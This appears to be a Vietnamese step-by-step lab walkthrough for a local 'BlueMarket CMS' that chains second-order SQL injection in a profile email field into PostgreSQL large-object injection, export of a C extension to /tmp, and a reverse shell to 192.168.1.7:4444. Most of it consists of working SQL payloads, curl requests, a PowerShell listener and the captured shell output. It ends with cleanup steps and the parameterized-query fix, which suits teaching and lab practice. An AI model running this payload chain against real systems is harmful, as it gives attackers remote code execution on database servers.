# Hướng 2: PostgreSQL Large Object + Extension -> Reverse Shell -> RCE

> Chỉ sử dụng trong lab local `BlueMarket CMS`. Từ ngày `2026-08-31`, Hướng 2 của lab này được chỉnh lại để bám đúng flow của PoC kiểu `pg_largeobject`: attacker tự chuẩn bị file `.so`, chia thành từng page 2048 byte, rồi bơm từng page qua second-order SQLi.

## 1. Vị trí lỗi trong app

Chức năng người dùng nhìn thấy:

```text
Seller Profile
Route: /profile?id=3
```

File xử lý:

```text
app/src/Controllers/ProfileController.php
```

Đoạn code vulnerable:

```php
$sql = "SELECT title, body, created_at
        FROM posts
        WHERE author_email = '" . $user['email'] . "'
        ORDER BY created_at DESC";
$activity = $activityDb->queryAll($sql);
```

Ý tưởng:

```text
Email được lưu trong bảng users
-> profile backend đọc email
-> Seller Activity Report nối email vào SQL mới
-> second-order SQLi
-> lo_create()
-> INSERT từng page binary vào pg_largeobject
-> lo_export() ghi file .so ra /tmp
-> CREATE FUNCTION LANGUAGE C
-> SELECT rev_shell(...)
-> reverse shell
```

## 2. Điểm khác so với flow cũ

Flow cũ của lab dùng:

```text
lo_import('/extensions/pg_rev_shell.so', 424242)
```

Flow mới dùng đúng kiểu PoC:

```text
attacker có pg_rev_shell.so ở máy mình
-> chia file thành từng page 2048 byte
-> lo_create(loid)
-> INSERT INTO pg_largeobject (loid, pageno, data) VALUES (...)
-> lo_export(loid, '/tmp/pg_rev_shell_manual.so')
-> CREATE FUNCTION
-> SELECT rev_shell(LHOST, LPORT)
```

Nói ngắn gọn:

```text
Flow cũ: server đã có sẵn file .so
Flow mới: attacker tự đưa bytes của .so vào database
```

## 3. Chuẩn bị file `pg_rev_shell.so` ở máy attacker

Runtime container không còn ship sẵn `/extensions/pg_rev_shell.so`. Bạn chuẩn bị file `.so` ở máy host trước.

### 3.1. Export file `.so` từ build stage

Trong thư mục lab:

```powershell
cd D:\SQL-lead-to-RCE\blue-market-lab
.\postgres\export-pg-rev-shell.ps1
```

Kết quả mong đợi:

```text
postgres/artifacts/pg_rev_shell.so
```

Script này chỉ làm hai việc:

```text
1. build target extension-builder
2. docker cp /tmp/pg_rev_shell.so ra máy host
```

### 3.2. Chia file thành từng page 2048 byte

```powershell
python .\postgres\split-so-pages.py .\postgres\artifacts\pg_rev_shell.so
```

Kết quả:

```text
postgres/artifacts/pg_rev_shell_pages/
  manifest.txt
  page-000.hex
  page-001.hex
  page-002.hex
  ...
```

Mở manifest:

```powershell
Get-Content .\postgres\artifacts\pg_rev_shell_pages\manifest.txt
```

Mỗi file `page-XXX.hex` là đúng một page để paste vào:

```sql
decode('<hex>', 'hex')
```

## 4. Thử profile bình thường

```powershell
curl.exe "http://localhost:5000/profile?id=3"
```

Kỳ vọng:

```text
Profile lan_store hiển thị bình thường.
Seller Activity Report có các row post của lan_store.
```

## 5. Đăng nhập seller

```powershell
curl.exe -c seller.txt --data-urlencode "username=lan_store" --data-urlencode "password=seller123" http://localhost:5000/login
```

Kiểm tra session:

```powershell
curl.exe -b seller.txt "http://localhost:5000/profile?id=3"
```

## 6. Thử second-order SQLi bằng payload nhẹ

Payload email:

```sql
x'; SELECT pg_sleep(2); SELECT title, body, created_at FROM posts WHERE '1'='1
```

Gửi update:

```powershell
$payload = @'
x'; SELECT pg_sleep(2); SELECT title, body, created_at FROM posts WHERE '1'='1
'@

curl.exe -b seller.txt -c seller.txt --data-urlencode "email=$payload" --data-urlencode "description=Second order SQLi probe" http://localhost:5000/profile/update
```

Trigger:

```powershell
curl.exe -s -o NUL -w "%{time_total}" -b seller.txt "http://localhost:5000/profile?id=3"
```

Nếu chậm thêm khoảng 2 giây thì second-order SQLi đã chạy.

Khôi phục email sau bước probe:

```powershell
curl.exe -b seller.txt -c seller.txt --data-urlencode "email=lan.store@bluemarket.local" --data-urlencode "description=Seller reset" http://localhost:5000/profile/update
```

## 7. Vì sao payload không kết thúc bằng `--`

Query trong app được ghép thành nhiều dòng:

```sql
SELECT title, body, created_at
FROM posts
WHERE author_email = '<email>'
ORDER BY created_at DESC
```

Nếu payload kết thúc bằng:

```sql
--
```

thì PostgreSQL chỉ comment đến hết dòng `WHERE author_email = ...`.

Dòng:

```sql
ORDER BY created_at DESC
```

vẫn còn, nên parser sẽ báo:

```text
syntax error at or near "ORDER"
```

Vì vậy mọi payload ở lab này phải khép lại bằng một câu `SELECT` hợp lệ:

```sql
SELECT title, body, created_at FROM posts WHERE '1'='1
```

## 8. Xây dựng payload từng bước

### 8.1. Chọn một LOID cố định cho buổi demo

Ví dụ:

```text
55001
```

Bạn có thể đổi LOID khác nếu muốn. Dùng cùng một LOID cho toàn bộ các page của một lần demo.

### 8.2. Bật listener trước

Xác định IPv4 của máy host:

```powershell
ipconfig
```

Ví dụ trong máy test ngày `2026-08-31`, listener dùng:

```text
192.168.1.7:4444
```

Mở listener trong terminal riêng:

```powershell
$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, 4444)
$listener.Start()
Write-Output 'LISTENING 4444'
$client = $listener.AcceptTcpClient()
Write-Output 'CONNECTED'
$stream = $client.GetStream()
$buffer = New-Object byte[] 8192
$cmds = @("id`n", "whoami`n", "pwd`n", "exit`n")

foreach ($cmd in $cmds) {
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)
    $stream.Write($bytes, 0, $bytes.Length)
    Start-Sleep -Milliseconds 500

    while ($stream.DataAvailable) {
        $read = $stream.Read($buffer, 0, $buffer.Length)
        if ($read -le 0) { break }
        [Console]::Out.Write([System.Text.Encoding]::ASCII.GetString($buffer, 0, $read))
        Start-Sleep -Milliseconds 200
    }
}

$client.Close()
$listener.Stop()
```

Lưu ý:

```text
pg_rev_shell.c dùng inet_pton(), nên chỉ nhận IPv4 literal.
Không dùng hostname như bm-listener.
```

### 8.3. Request 1: tạo Large Object rỗng

Payload email:

```sql
x'; DROP FUNCTION IF EXISTS rev_shell(text, integer); SELECT CASE WHEN EXISTS (SELECT 1 FROM pg_largeobject_metadata WHERE oid = 55001::oid) THEN lo_unlink(55001) ELSE 0 END; SELECT lo_create(55001); SELECT title, body, created_at FROM posts WHERE '1'='1
```

Gửi payload:

```powershell
$payload = @'
x'; DROP FUNCTION IF EXISTS rev_shell(text, integer); SELECT CASE WHEN EXISTS (SELECT 1 FROM pg_largeobject_metadata WHERE oid = 55001::oid) THEN lo_unlink(55001) ELSE 0 END; SELECT lo_create(55001); SELECT title, body, created_at FROM posts WHERE '1'='1
'@

curl.exe -b seller.txt -c seller.txt --data-urlencode "email=$payload" --data-urlencode "description=Create large object" http://localhost:5000/profile/update
curl.exe -b seller.txt "http://localhost:5000/profile?id=3"
```

### 8.4. Request 2 tới Request N: chèn từng page vào `pg_largeobject`

Mở page đầu tiên:

```powershell
Get-Content .\postgres\artifacts\pg_rev_shell_pages\page-000.hex
```

Giả sử nội dung file là `<HEX_PAGE_000>`, payload sẽ là:

```sql
x'; INSERT INTO pg_largeobject (loid, pageno, data) VALUES (55001, 0, decode('<HEX_PAGE_000>', 'hex')); SELECT title, body, created_at FROM posts WHERE '1'='1
```

Gửi request:

```powershell
$hex = Get-Content .\postgres\artifacts\pg_rev_shell_pages\page-000.hex
$payload = "x'; INSERT INTO pg_largeobject (loid, pageno, data) VALUES (55001, 0, decode('$hex', 'hex')); SELECT title, body, created_at FROM posts WHERE '1'='1"

curl.exe -b seller.txt -c seller.txt --data-urlencode "email=$payload" --data-urlencode "description=Page 0" http://localhost:5000/profile/update
curl.exe -b seller.txt "http://localhost:5000/profile?id=3"
```

Page thứ hai tương tự:

```powershell
$hex = Get-Content .\postgres\artifacts\pg_rev_shell_pages\page-001.hex
$payload = "x'; INSERT INTO pg_largeobject (loid, pageno, data) VALUES (55001, 1, decode('$hex', 'hex')); SELECT title, body, created_at FROM posts WHERE '1'='1"

curl.exe -b seller.txt -c seller.txt --data-urlencode "email=$payload" --data-urlencode "description=Page 1" http://localhost:5000/profile/update
curl.exe -b seller.txt "http://localhost:5000/profile?id=3"
```

Lặp lại cho tới page cuối cùng trong `manifest.txt`.

### 8.5. Request cuối: export `.so`, unlink LO, tạo function, gọi reverse shell

Payload email:

```sql
x'; SELECT lo_export(55001, '/tmp/pg_rev_shell_manual.so'); SELECT lo_unlink(55001); CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell_manual', 'rev_shell' LANGUAGE C STRICT; SELECT rev_shell('192.168.1.7', 4444); SELECT title, body, created_at FROM posts WHERE '1'='1
```

Gửi payload:

```powershell
$payload = @'
x'; SELECT lo_export(55001, '/tmp/pg_rev_shell_manual.so'); SELECT lo_unlink(55001); CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell_manual', 'rev_shell' LANGUAGE C STRICT; SELECT rev_shell('192.168.1.7', 4444); SELECT title, body, created_at FROM posts WHERE '1'='1
'@

curl.exe -b seller.txt -c seller.txt --data-urlencode "email=$payload" --data-urlencode "description=Export extension and trigger shell" http://localhost:5000/profile/update
curl.exe -b seller.txt "http://localhost:5000/profile?id=3"
```

Request trigger có thể treo vì backend đang giữ reverse shell.

## 9. Chứng minh RCE trên listener

Kết quả mong đợi:

```text
CONNECTED
uid=999(postgres) gid=999(postgres) groups=999(postgres)
postgres
/var/lib/postgresql/data
```

Đây là các giá trị đã được quan sát trong lab vào ngày `2026-08-31` khi Hướng 2 chạy thành công.

## 10. Nếu bạn demo hoàn toàn bằng Burp Repeater

Mỗi page sẽ đi qua đúng hai bước:

```text
1. POST /profile/update để lưu payload vào email
2. GET /profile?id=3 để trigger query second-order
```

Nếu file có `12` page, số request tối thiểu là:

```text
1 request tạo LO
+ 12 request chèn page
+ 1 request export/create function/rev_shell
```

Vì mỗi bước đều cần một request trigger sau đó, tổng thao tác thực tế là:

```text
(1 + 12 + 1) * 2 = 28 request HTTP
```

Nói cách khác:

```text
demo tay được
nhưng sẽ chậm hơn flow lo_import cũ
```

## 11. Lỗi hay gặp khi demo tay

### 11.1. `syntax error at or near "ORDER"`

Nguyên nhân:

```text
Payload kết thúc bằng --
```

Cách sửa:

```text
Kết thúc payload bằng:
SELECT title, body, created_at FROM posts WHERE '1'='1
```

### 11.2. `duplicate key value violates unique constraint "pg_largeobject_loid_pn_index"`

Nguyên nhân:

```text
Bạn đã bơm lại cùng một (loid, pageno)
```

Cách sửa:

```text
- đổi sang LOID mới; hoặc
- unlink LO cũ rồi làm lại từ đầu
```

### 11.3. Reverse shell không quay về

Nguyên nhân thường gặp:

```text
1. LHOST không phải IPv4 literal
2. LHOST sai địa chỉ máy host hiện tại
3. Listener chưa mở trước khi trigger
4. pg_rev_shell.so compile lệch version PostgreSQL
```

### 11.4. `CREATE FUNCTION` lỗi

Nguyên nhân:

```text
extension_user không đủ quyền hoặc file /tmp/pg_rev_shell_manual.so không tồn tại
```

## 12. Cleanup

### 12.1. Cleanup function và file export

Payload cleanup:

```sql
x'; DROP FUNCTION IF EXISTS rev_shell(text, integer); SELECT CASE WHEN EXISTS (SELECT 1 FROM pg_largeobject_metadata WHERE oid = 55001::oid) THEN lo_unlink(55001) ELSE 0 END; SELECT title, body, created_at FROM posts WHERE '1'='1
```

Gửi payload:

```powershell
$payload = @'
x'; DROP FUNCTION IF EXISTS rev_shell(text, integer); SELECT CASE WHEN EXISTS (SELECT 1 FROM pg_largeobject_metadata WHERE oid = 55001::oid) THEN lo_unlink(55001) ELSE 0 END; SELECT title, body, created_at FROM posts WHERE '1'='1
'@

curl.exe -b seller.txt -c seller.txt --data-urlencode "email=$payload" --data-urlencode "description=Cleanup rev_shell" http://localhost:5000/profile/update
curl.exe -b seller.txt "http://localhost:5000/profile?id=3"
```

### 12.2. Trả email seller về bình thường

```powershell
curl.exe -b seller.txt -c seller.txt --data-urlencode "email=lan.store@bluemarket.local" --data-urlencode "description=Seller reset" http://localhost:5000/profile/update
Remove-Item -Force seller.txt
```

## 13. Điều kiện để thành công

```text
1. APP_MODE=vulnerable.
2. Seller có thể cập nhật email.
3. Seller Activity Report dùng email bằng nối chuỗi SQL.
4. Role extension_user có quyền cao để tạo Large Object, export file và dùng LANGUAGE C.
5. Attacker chuẩn bị được pg_rev_shell.so đúng version PostgreSQL 13.
6. LHOST là IPv4 literal và listener mở trước.
```

## 14. Fixed mode chặn ở đâu

Trong fixed mode:

```php
$activity = $activityDb->params(
    'SELECT title, body, created_at
     FROM posts
     WHERE author_email = $1
     ORDER BY created_at DESC',
    [$user['email']]
);
```

Email chỉ là data trong `$1`, không thể trở thành SQL. Backend cũng dùng `app_user`, không dùng `extension_user`.
